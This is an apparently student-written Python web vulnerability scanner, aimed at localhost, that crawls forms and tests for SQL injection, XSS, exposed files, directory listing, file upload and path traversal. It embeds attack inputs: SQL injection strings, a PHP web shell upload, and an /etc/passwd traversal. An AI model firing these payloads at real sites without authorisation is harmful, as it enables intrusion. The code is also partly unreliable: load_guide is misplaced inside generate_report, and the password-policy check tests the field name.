import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re
import logging
import string
import time
import concurrent.futures
import os
import json
from fpdf import FPDF

#함수 테스트용이 아니라 CLI 틀을 잡아놓기 위해서 써놓은 겁니다!!
#테스트는 이전 버전으로 테스트를 진행하면서 수정하고, generate_report 메소드에 맞춰서 수정해야합니다
#check_xss만 그에 맞춰 수정해두었습니다(but, 탐지x)


# 로깅 설정
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# HTTP 세션 사용
session = requests.Session()

# 웹 스캐너 클래스
class WebScanner:
    def __init__(self, base_url, depth=3):
        self.base_url = base_url
        self.depth = depth
        self.visited_urls = set()
        self.attack_vectors = []
        self.xss_payloads = self.load_xss_payloads('xsspayload.txt')
        self.results = []
        
    def sanitize_filename(self, filename):
        return re.sub(r'[<>:"/\\|?*]', '_', filename)
        
    #리스폰스 확인용
    def save_response_to_file(self, url, payload, response_text):
        directory = 'responses'
        if not os.path.exists(directory):
            os.makedirs(directory)

        # 파일 이름 생성 시 특수 문자를 언더스코어로 대체하여 파일 이름 충돌 방지
        sanitized_url = self.sanitize_filename(url)
        sanitized_payload = self.sanitize_filename(str(payload))

        filename = os.path.join(directory, f"response_{sanitized_url}_{sanitized_payload}.txt")
        with open(filename, 'w', encoding='utf-8') as file:
            file.write(response_text)


    def load_xss_payloads(self, filepath):
        try:
            with open(filepath, 'r', encoding='utf-8') as file:
                payloads = [line.strip() for line in file.readlines()]
                logger.info(f"Loaded {len(payloads)} XSS payloads")
                return payloads
        except FileNotFoundError:
            logger.error(f"XSS payload file not found: {filepath}")
            return []
        except UnicodeDecodeError as e:
            logger.error(f"Error decoding file {filepath}: {e}")
            return []

    def run_security_checks(self):
        start_time = time.time()  # 시작 시간 기록

        # 크롤링 수행
        self.crawl(self.base_url, self.depth)

        # 보안 검사 병렬 수행
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for url, method, inputs in self.attack_vectors:
                futures.append(executor.submit(self.check_sql_injection, url, method, inputs))
                futures.append(executor.submit(self.check_xss, url, method, inputs))
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    logger.info(result)

        # 기타 보안 점검 동기적으로 수행
        if self.check_information_disclosure(self.base_url):
            logger.info("Information Disclosure vulnerability detected.")
        else:
            logger.info("No Information Disclosure vulnerability detected.")

        if self.check_password_strength_policy(self.base_url):
            logger.info("Password strength policy is weak or missing.")
        else:
            logger.info("Password strength policy is adequate.")

        if self.check_location_exposure(self.base_url):
            logger.info("Location Exposure vulnerability detected.")
        else:
            logger.info("No Location Exposure vulnerability detected.")
        
        if self.check_directory_indexing(self.base_url):
            logger.info("Directory Indexing vulnerability detected.")
        else:
            logger.info("No Directory Indexing vulnerability detected.")
        
        if self.check_file_upload(self.base_url):
            logger.info("File Upload vulnerability detected.")
        else:
            logger.info("No File Upload vulnerability detected.")
        
        if self.check_file_download(self.base_url):
            logger.info("File Download vulnerability detected.")
        else:
            logger.info("No File Download vulnerability detected.")
            
        self.generate_report()
        end_time = time.time()  # 종료 시간 기록
        total_time = end_time - start_time
        logger.info(f"Total time taken for security checks: {total_time:.2f} seconds")

    def crawl(self, url, depth):
        if depth == 0 or url in self.visited_urls or not url.startswith(self.base_url):
            return
        self.visited_urls.add(url)
        
        try:
            response = session.get(url, timeout=5)
            response.raise_for_status()
        except requests.RequestException as e:
            logger.error(f"Error during request to {url}: {e}")
            return

        soup = BeautifulSoup(response.text, 'html.parser')

        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            form_url = urljoin(self.base_url, action)
            if self.check_url_existence(form_url):
                self.attack_vectors.append((form_url, method, inputs))

        links = soup.find_all('a', href=True)
        for link in links:
            href = link.get('href')
            next_url = urljoin(self.base_url, href)
            if self.check_url_existence(next_url):
                self.crawl(next_url, depth - 1)

        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        if query_params:
            self.attack_vectors.append((url, 'get', query_params))

    def check_sql_injection(self, url, method, inputs):
        payloads = [
            (["'", '"', ";", "--", "/*", "*/", "#"], ["syntax error", "unexpected", "error in your SQL syntax"]),
            (["1=1", "' OR '1'='1", "\" OR \"1\"=\"1"], [""]),
            (["1=2", "' AND '1'='2", "\" AND \"1\"=\"2"], [""]),
            (["UNION SELECT NULL", "UNION SELECT NULL, NULL", "UNION SELECT NULL, NULL, NULL"], ["column", "syntax error", "number of columns"]),
            (["' OR SLEEP(5)--", "\" OR SLEEP(5)--"], [""]),
        ]

        for payload_group, patterns in payloads:
            for payload in payload_group:
                response = self.send_payload(url, method, inputs, payload)
                if response:
                    if "SLEEP" in payload and response.elapsed.total_seconds() > 5:
                        return f"Time-based SQL Injection vulnerability detected at {url} with payload: {payload}"
                    if any(pattern in response.text.lower() for pattern in patterns):
                        return f"SQL Injection vulnerability detected at {url} with payload: {payload}"
        return f"No SQL Injection vulnerability detected at {url}"

    def check_xss(self, url, method, inputs):
        session = requests.Session()
        
        def submit_form(payload):
            data = {
                'title': payload,
                'writer': payload,
                'content': payload
            }
            try:
                response = session.post(url, data=data, timeout=10)
                response.raise_for_status()
                return response
            except requests.RequestException as e:
                logger.error(f"Error during form submission to {url} with payload {payload}: {e}")
                return None

        def is_reflective_xss_detected(response_text, payload):
            # 에러 메시지가 포함된 경우 취약점 탐지를 무시
            if "No file uploaded" in response_text or "You have an error in your SQL syntax" in response_text:
                return False
            return payload in response_text
        
        def is_stored_xss_detected(response_text, payload):
            return payload in response_text

        # Reflective XSS 검사
        for payload in self.xss_payloads:
            response = submit_form(payload)
            if response:
                self.save_response_to_file(url, payload, response.text)
                if is_reflective_xss_detected(response.text, payload):
                    self.results.append({
                        'type': 'Reflective XSS',
                        'url': url,
                        'payload': payload
                    })

        # Stored XSS 검사
        stored_xss_test_page = "http://127.0.0.1/main.php"
        for payload in self.xss_payloads:
            response = submit_form(payload)
            if response:
                self.save_response_to_file(url, payload, response.text)
                try:
                    time.sleep(2)

                    stored_response = session.get(stored_xss_test_page, timeout=10)
                    stored_response.raise_for_status()
                    self.save_response_to_file(stored_xss_test_page, payload, stored_response.text)
                    if is_stored_xss_detected(stored_response.text, payload):
                        self.results.append({
                            'type': 'Stored XSS',
                            'url': stored_xss_test_page,
                            'payload': payload
                        })
                except requests.RequestException as e:
                    logger.error(f"Error during request to {stored_xss_test_page}: {e}")



    def send_payload(self, url, method, inputs, payload):
        if isinstance(inputs, dict):
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            for key in query_params:
                query_params[key] = payload
            encoded_query = urlencode(query_params, doseq=True)
            attack_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{encoded_query}"
        else:
            data = {inp.get('name'): payload for inp in inputs if inp.get('name')}
            if method == 'post':
                if not self.check_url_existence(url):
                    return None
                try:
                    response = session.post(url, data=data, timeout=10)
                    response.raise_for_status()
                    return response
                except requests.RequestException as e:
                    logger.error(f"Error during POST request to {url} with data {data}: {e}")
                    return None
            else:
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                for key in data:
                    query_params[key] = payload
                encoded_query = urlencode(query_params, doseq=True)
                attack_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{encoded_query}"
        
        try:
            response = session.get(attack_url, timeout=10)
            response.raise_for_status()
            return response
        except requests.RequestException as e:
            logger.error(f"Error during request to {attack_url}: {e}")
            return None

    def check_url_existence(self, url):
        try:
            response = session.head(url, allow_redirects=True, timeout=5)
            return response.status_code == 200
        except requests.RequestException as e:
            logger.error(f"Error checking URL existence: {url}, {e}")
            return False

    def check_information_disclosure(self, url):
        sensitive_files = [".env", ".git", ".DS_Store", "config.php", "web.config", "database.yml"]
        debug_patterns = [
            "exception", "error", "stack trace", "traceback", "debug", "line", "file", "fatal", "not found",
            "permission denied", "unauthorized", "access denied", "undefined variable", "undefined index", "SQL"
        ]
        vulnerable = False

        for file in sensitive_files:
            file_url = urljoin(url, file)
            try:
                response = session.get(file_url, timeout=10)
                if response.status_code == 200:
                    logger.info(f"Sensitive file exposed: {file_url}")
                    vulnerable = True
            except requests.RequestException as e:
                logger.error(f"Error during request to {file_url}: {e}")

        try:
            response = session.get(url, timeout=10)
            response.raise_for_status()
            page_content = response.text.lower()

            for pattern in debug_patterns:
                if pattern in page_content:
                    logger.info(f"Potential information disclosure detected at {url} with pattern: {pattern}")
                    vulnerable = True
        except requests.RequestException as e:
            logger.error(f"Error during request to {url}: {e}")

        test_urls = [
            f"{url}/nonexistentpage",
            f"{url}?testparam=' OR 1=1 --"
        ]

        for test_url in test_urls:
            try:
                response = session.get(test_url, timeout=10)
                response.raise_for_status()
                page_content = response.text.lower()

                for pattern in debug_patterns:
                    if pattern in page_content:
                        logger.info(f"Potential information disclosure detected at {test_url} with pattern: {pattern}")
                        vulnerable = True
            except requests.RequestException as e:
                logger.error(f"Error during request to {test_url}: {e}")

        return vulnerable

    def check_password_strength_policy(self, url):
        try:
            response = session.get(url, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            password_fields = soup.find_all('input', {'type': 'password'})
            for password_field in password_fields:
                form = password_field.find_parent('form')
                if form:
                    form_action = form.get('action')
                    form_method = form.get('method', 'get').lower()
                    form_url = urljoin(self.base_url, form_action)
                    if self.check_password_policy(form):
                        logger.info(f"Weak password policy detected at form {form_url} with method {form_method}")
                        return True
            return False
        except requests.RequestException as e:
            logger.error(f"Error during request to {url}: {e}")
            return False

    def check_password_policy(self, form):
        patterns = {
            "length": r".{8,}",
            "uppercase": r"[A-Z]",
            "lowercase": r"[a-z]",
            "digit": r"[0-9]",
            "special": r"[!@#\$%\^&\*\(\)_\+\-=\[\]\{\};:'\"\\|,.<>\/?]",
            "no_common_passwords": r"^(?!(password|123456|12345678|admin|welcome)).*$",
            "no_repeated_chars": r"^(?!.*(.)\1{2}).*$"
        }
        password_field_name = form.find('input', {'type': 'password'}).get('name')
        for pattern_name, pattern in patterns.items():
            if not re.search(pattern, password_field_name):
                return False
        return True

    def check_location_exposure(self, url):
        try:
            response = session.get(url, timeout=10)
            ip_headers = ["X-Forwarded-For", "X-Real-IP", "Client-IP", "X-Cluster-Client-IP"]
            gps_keywords = ["navigator.geolocation.getCurrentPosition", "getCurrentPosition"]

            for header in ip_headers:
                if header in response.headers:
                    logger.info(f"Potential IP address exposure in header: {header} = {response.headers[header]}")
                    return True
            
            if any(keyword in response.text for keyword in gps_keywords):
                logger.info(f"Potential GPS data exposure found in response.")
                return True

            soup = BeautifulSoup(response.text, 'html.parser')
            if soup.find("meta", {"name": "geo.position"}):
                logger.info(f"Potential GPS meta tag exposure found in response.")
                return True
        except requests.RequestException as e:
            logger.error(f"Error during request to {url}: {e}")

        return False

    def check_directory_indexing(self, url):
        potential_directories = ['img', 'images', 'uploads', 'files', 'assets', '../../../../img']
        for directory in potential_directories:
            test_url = urljoin(url, directory)
            try:
                response = session.get(test_url, timeout=10)
                response.raise_for_status()
                if "Index of /" in response.text or "directory listing" in response.text.lower():
                    logger.info(f"Directory Indexing vulnerability detected at {test_url}")
                    return True
            except requests.RequestException as e:
                logger.error(f"Error during request to {test_url}: {e}")
        return False

    def check_file_upload(self, form_url):
        meta_char_file = {'file': ('../test.txt', 'This is a test file.')}
        web_shell_file = {'file': ('shell.php', '<?php echo shell_exec($_GET["cmd"]); ?>')}

        def verify_upload(upload_response, file_name):
            if upload_response.status_code == 200:
                # 업로드된 파일 확인
                verify_url = urljoin(form_url, file_name)
                try:
                    verify_response = session.get(verify_url, timeout=10)
                    if verify_response.status_code == 200 and 'This is a test file.' in verify_response.text:
                        return True
                except requests.RequestException as e:
                    logger.error(f"Error verifying uploaded file at {verify_url}: {e}")
            return False

        try:
            response = session.post(form_url, files=meta_char_file, timeout=10)
            if verify_upload(response, 'test.txt'):
                logger.info(f"Meta character file upload successful at {form_url}")
                return True
        except requests.RequestException as e:
            logger.error(f"Error during meta character file upload to {form_url}: {e}")

        try:
            response = session.post(form_url, files=web_shell_file, timeout=10)
            if verify_upload(response, 'shell.php'):
                logger.info(f"Web shell file upload successful at {form_url}")
                return True
        except requests.RequestException as e:
            logger.error(f"Error during web shell file upload to {form_url}: {e}")

        return False

    def check_file_download(self, url):
        # 원래라면 이게 맞을 것 같은데 현재 다운로드 페이지가 이게 맞는지 모르겠어서...테스트는 못하고 작성했습니다
        try:
            response = session.get(url, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            download_links = soup.find_all('a', href=True)

            for link in download_links:
                href = link.get('href')
                if 'filename=' in href:
                    download_url = urljoin(self.base_url, href)
                    if self.check_url_existence(download_url):
                        logger.info(f"Valid file download link detected at {download_url}")

                        parsed_url = urlparse(download_url)
                        params = parse_qs(parsed_url.query)
                        params['filename'] = '../../../../../../etc/passwd'
                        modified_query = urlencode(params, doseq=True)
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
                        
                        try:
                            test_response = session.get(test_url, timeout=10)
                            if test_response.status_code == 200 and 'root:' in test_response.text:
                                logger.info(f"File Download vulnerability detected at {test_url}")
                                return True
                        except requests.RequestException as e:
                            logger.error(f"Error during file download test request to {test_url}: {e}")

            return False
        except requests.RequestException as e:
            logger.error(f"Error during request to {url}: {e}")
            return False
        
    #CLI를 위해 틀만 잡아놓았습니다 각 메소드들 이에 맞춰서 수정이 필요합니다
    def generate_report(self):
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", size=12)

        pdf.cell(200, 10, txt=f"Security Report for {self.base_url}", ln=True, align='C')
        pdf.ln(10)

        for result in self.results:
            pdf.cell(200, 10, txt=f"Vulnerability Type: {result['type']}", ln=True)
            pdf.cell(200, 10, txt=f"URL: {result['url']}", ln=True)
            pdf.cell(200, 10, txt=f"Payload: {result['payload']}", ln=True)
            pdf.ln(10)

            guide = self.load_guide(result['type'])
            if guide:
                pdf.multi_cell(0, 10, guide)
                pdf.ln(10)

        pdf.output("security_report.pdf")
        
        #대응방안은 json파일 형식으로 저장해놓고 읽는 형식을 택했습니다
        def load_guide(self, vuln_type):
            try:
                with open('guides.json', 'r', encoding='utf-8') as file:
                    guides = json.load(file)
                    return guides.get(vuln_type, "No guide available for this vulnerability.")
            except FileNotFoundError:
                logger.error(f"Guide file not found.")
                return "Guide file not found."
            except json.JSONDecodeError as e:
                logger.error(f"Error decoding JSON file: {e}")
                return "Error decoding JSON file."

# 예제 실행
base_url = "http://127.0.0.1"
scanner = WebScanner(base_url)
scanner.run_security_checks()
